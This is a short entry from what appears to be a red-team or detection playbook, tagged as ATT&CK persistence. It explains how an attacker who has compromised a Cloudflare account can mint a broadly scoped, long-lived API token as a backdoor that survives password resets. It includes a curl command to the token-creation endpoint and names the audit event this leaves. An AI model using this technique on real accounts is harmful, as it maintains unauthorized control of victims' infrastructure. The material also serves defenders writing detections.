---
id: cf-api-token
title: Cloudflare API token backdoor (durable account access)
section: Cloudflare / edge
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1098]
platform: [cloudflare]
source: Cloudflare post-compromise persistence (API token)
pair: cf-api-token-audit
---

After compromising a Cloudflare account, mint your own **API token**: a long-lived,
non-interactive credential scoped to zones/Workers/DNS that drives the full API and
survives the victim's password/session reset — a clean control-plane backdoor that blends
in among automation. Creation writes a Cloudflare audit event with
`resource.type=api_token` and `action.type=create`. (Edge control plane — no on-host
target, so no slots.)

```sh
# mint an API token for durable API access (scope it broad: zone, dns, workers)
curl -s -X POST "https://api.cloudflare.com/client/v4/user/tokens" \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d @token.json
```
